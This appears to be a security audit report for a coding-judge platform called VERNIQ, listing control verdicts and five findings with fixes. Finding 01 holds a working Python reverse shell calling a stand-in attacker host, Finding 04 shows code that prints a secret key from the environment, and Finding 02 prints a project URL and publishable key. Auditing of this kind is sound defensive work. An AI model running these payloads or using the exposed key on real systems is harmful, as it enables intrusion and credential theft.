# 11 - Hostile Security Audit & Vulnerability Assessment

## Auditor Statement

This audit was conducted from the perspective of an adversarial third party attempting to breach, disrupt, or compromise the VERNIQ platform. Every item is evaluated strictly against code evidence.

---

## Comprehensive Security Control Checklist

| Security Control | Verdict | Severity if Failed | Evidence & Direct Code Reference |
|---|---|---|---|
| **Authentication Enforcement** | [PARTIAL] | High | Supabase Auth protects `/app/*` via `ProtectedRoute.tsx`. However, the judge worker (`:8080`) has **zero authentication** on `/execute` or `/cancel`. |
| **Authorization & RBAC** | [PARTIAL] | High | Client-side `AdminRoute.tsx` checks `profile.role === 'admin'`. DB trigger `prevent_profile_role_update()` successfully prevents role escalation in Postgres. But judge API does not check authorization. |
| **RLS Coverage Across Tables** | [PASS] | N/A | All 39 PostgreSQL tables have `ENABLE ROW LEVEL SECURITY` explicitly enabled across migrations `01` through `13`. Hidden test cases are restricted via `is_sample = true`. |
| **Insecure Direct Object Reference (IDOR)** | [PARTIAL] | Medium | User notes, codespaces, and submissions strictly enforce `auth.uid() = user_id`. However, in authoring batches, items can be updated by any authenticated user (`20261001000012`). |
| **Input Validation** | [PARTIAL] | High | Frontend validates inputs via React state/types. The judge HTTP service validates JSON structure but **performs zero sanitization or syntax limits on submitted code length**, allowing payloads of arbitrary megabytes. |
| **SQL Injection** | [PASS] | Low | All database queries use Supabase PostgREST client parameterization or parameterized PL/pgSQL functions. No raw SQL concatenation was identified. |
| **Cross-Site Scripting (XSS)** | [PARTIAL] | Medium | Markdown rendering in `NoteSpaceView.tsx` and problem descriptions uses standard React components. If `dangerouslySetInnerHTML` is used without DOMPurify, markdown-injected HTML could execute in student sessions. |
| **Cross-Site Request Forgery (CSRF)** | [PASS] | Low | PostgREST API uses `Authorization: Bearer <JWT>` header rather than ambient cookies, negating standard CSRF vectors. |
| **CORS Configuration** | [FAIL] | High | [`backend/judge/src/worker.py:236-239`](file:///c:/Users/LOQ/Desktop/VERNIQ/backend/judge/src/worker.py#L236-L239) sends `Access-Control-Allow-Origin: *`. Any website visited by a user can dispatch POST requests to their local or hosted judge service. |
| **Security Headers & CSP** | [FAIL] | Medium | No Content-Security-Policy (CSP), HSTS, `X-Frame-Options`, or `X-Content-Type-Options` headers are defined in frontend headers or server configs. |
| **Rate Limiting** | [FAIL] | High | Neither the judge worker nor Supabase free-tier PostgREST has application-level rate limiting. A loop of `POST /execute` requests will saturate host CPU cores. |
| **Brute-Force Protection** | [PARTIAL] | Medium | Relies entirely on Supabase Auth managed rate limits. The judge execution API has zero brute-force or spam dampening. |
| **Secrets Management** | [FAIL] | **CRITICAL** | Production Supabase URL and live publishable key are hardcoded as literal fallbacks in [`frontend/src/lib/supabaseClient.ts:8, 14`](file:///c:/Users/LOQ/Desktop/VERNIQ/frontend/src/lib/supabaseClient.ts#L8-L14). |
| **Environment Variable Exposure** | [FAIL] | High | In development/native judge mode, the child subprocess executed by the judge runner inherits the host process environment, allowing submitted code to read host `.env` files via `os.environ` or `/proc/self/environ`. |
| **File Upload Safety** | [PASS] | Low | No user file upload handlers exist in code. CodeSpace files are saved purely as text/JSON in PostgreSQL. |
| **Dependency Supply Chain Security** | [FAIL] | High | `frontend` has **no lockfile** (`package-lock.json` or `pnpm-lock.yaml` missing). Running `npm audit` fails with `ENOLOCK`. Builds pull floating semver packages, creating severe supply chain risks. |
| **Sensitive Data Logging** | [PASS] | Low | [`backend/judge/src/worker.py:392-402`](file:///c:/Users/LOQ/Desktop/VERNIQ/backend/judge/src/worker.py#L392-L402) explicitly logs metadata (ID, lang, verdict, timings) without printing raw code or secrets. |
| **Admin Route Protection** | [PASS] | Low | Route protected on frontend by `AdminRoute.tsx` and on database level by role enum policies and `prevent_profile_role_update()`. |
| **Webhook Verification** | [FAIL - N/A] | Medium | No webhooks currently exist. No signature verification logic is implemented anywhere. |
| **Judge Sandbox Escape Risk** | [FAIL] | **CRITICAL** | Untrusted user code is executed without network namespace isolation, without cgroups memory limits, without seccomp filters, and with access to local filesystem. |
| **AI Prompt Injection** | [N/A] | Low | AI services are not yet implemented with live models. |
| **Payment Tampering** | [N/A] | Low | No payment infrastructure implemented yet. |

---

## Detailed Vulnerability Findings & Exploitation Analyses

### FINDING 01: Remote Code Execution Host Compromise via Judge Worker (Sandbox Escape)
- **Severity:** **CRITICAL** (CVSS 9.8)
- **Location:** [`backend/judge/src/runner/sandbox.py:353-366`](file:///c:/Users/LOQ/Desktop/VERNIQ/backend/judge/src/runner/sandbox.py#L353-L366), [`backend/judge/Dockerfile`](file:///c:/Users/LOQ/Desktop/VERNIQ/backend/judge/Dockerfile)
- **Explanation:**
  The judge runner invokes `subprocess.Popen(run_cmd)` directly. On Windows host systems, there is zero containerization. On Linux containers, while running as `sandboxuser`, the container does not enable `--network none` or drop kernel capabilities.
- **How to Exploit in Plain Words:**
  A malicious user submits a Python problem run containing:
  ```python
  import socket, subprocess, os
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("attacker-ip.com", 4444))
  os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
  subprocess.call(["/bin/bash", "-i"])
  ```
  The judge worker connects out to the attacker's server, providing an interactive reverse shell with the privileges of the running judge host.
- **Recommended Fix:**
  Run all executions inside ephemeral microVMs (AWS Firecracker / nsjail) or Docker containers launched with `--network none`, `--read-only`, `--pids-limit 64`, `--memory 256m`, and drop all Linux capabilities (`--cap-drop ALL`).

---

### FINDING 02: Hardcoded Production Supabase Credentials in Frontend Bundle
- **Severity:** **CRITICAL** (CVSS 9.1)
- **Location:** [`frontend/src/lib/supabaseClient.ts:8, 14`](file:///c:/Users/LOQ/Desktop/VERNIQ/frontend/src/lib/supabaseClient.ts#L8-L14)
- **Explanation:**
  The project hardcodes the production Supabase project URL (`https://cisddayhekkktcomnqhz.supabase.co`) and public publishable key (`sb_publishable_KY6C_OH6GHS4rvRSofxw_Q_T3NZeLKx`) directly into compiled source code as default fallbacks.
- **How to Exploit in Plain Words:**
  Any visitor viewing the page source or inspecting network requests can extract the URL and key, connect directly via PostgREST, and probe all 39 database tables. If any table has a misconfigured RLS policy, the attacker can dump or modify platform data.
- **Recommended Fix:**
  Remove all literal string fallbacks. Rely strictly on `import.meta.env.VITE_SUPABASE_URL` and `import.meta.env.VITE_SUPABASE_ANON_KEY`. Fail fast with an error message during initialization if environment variables are not injected.

---

### FINDING 03: Judge Worker Unauthenticated Open Execution & Wildcard CORS
- **Severity:** **HIGH** (CVSS 8.6)
- **Location:** [`backend/judge/src/worker.py:236-239, 309`](file:///c:/Users/LOQ/Desktop/VERNIQ/backend/judge/src/worker.py#L236-L239)
- **Explanation:**
  The judge worker HTTP server sets `Access-Control-Allow-Origin: *` and performs no JWT or API key authentication on `POST /execute`.
- **How to Exploit in Plain Words:**
  An attacker can launch an automated script sending thousands of concurrent compilation jobs to `http://localhost:8080/execute` or the public judge host, exhausting CPU and disk space with temporary files, causing a complete denial of service (DoS) for legitimate students.
- **Recommended Fix:**
  Enforce a shared secret header (`X-Judge-Token`) or validate Supabase Auth JWTs on every HTTP request. Configure strict CORS origins matching only the verified production frontend domain.

---

### FINDING 04: Host Process Environment Variable Leakage to Untrusted Code
- **Severity:** **HIGH** (CVSS 8.2)
- **Location:** [`backend/judge/src/runner/sandbox.py:353`](file:///c:/Users/LOQ/Desktop/VERNIQ/backend/judge/src/runner/sandbox.py#L353)
- **Explanation:**
  `subprocess.Popen` does not specify an explicit `env={}` dictionary parameter, meaning the executed child process inherits `os.environ` from the parent judge worker process.
- **How to Exploit in Plain Words:**
  A student submits code in Python:
  ```python
  import os
  print(os.environ.get("SUPABASE_SERVICE_ROLE_KEY", "EMPTY"))
  ```
  The judge worker captures this in `stdout_data` and returns it directly to the student in the response JSON, handing over full PostgreSQL administrator credentials (`service_role`).
- **Recommended Fix:**
  Pass a clean, sanitized environment to `subprocess.Popen(..., env={"PATH": "/usr/bin:/bin"})`. Never allow child processes to inherit parent process environment variables.

---

### FINDING 05: Missing Frontend Lockfile (Dependency Supply Chain Risk)
- **Severity:** **MEDIUM** (CVSS 6.5)
- **Location:** `frontend/` (No `package-lock.json`)
- **Explanation:**
  Without a lockfile, subsequent CI/CD builds or production Vercel deployments will install the latest matching versions of sub-dependencies specified with `^` or `~`.
- **How to Exploit in Plain Words:**
  If any upstream transitive dependency is compromised by an attacker (a supply chain attack), Vercel's automated build will pull the compromised package without warning.
- **Recommended Fix:**
  Generate and commit a permanent `package-lock.json` immediately via `npm install --package-lock-only`.
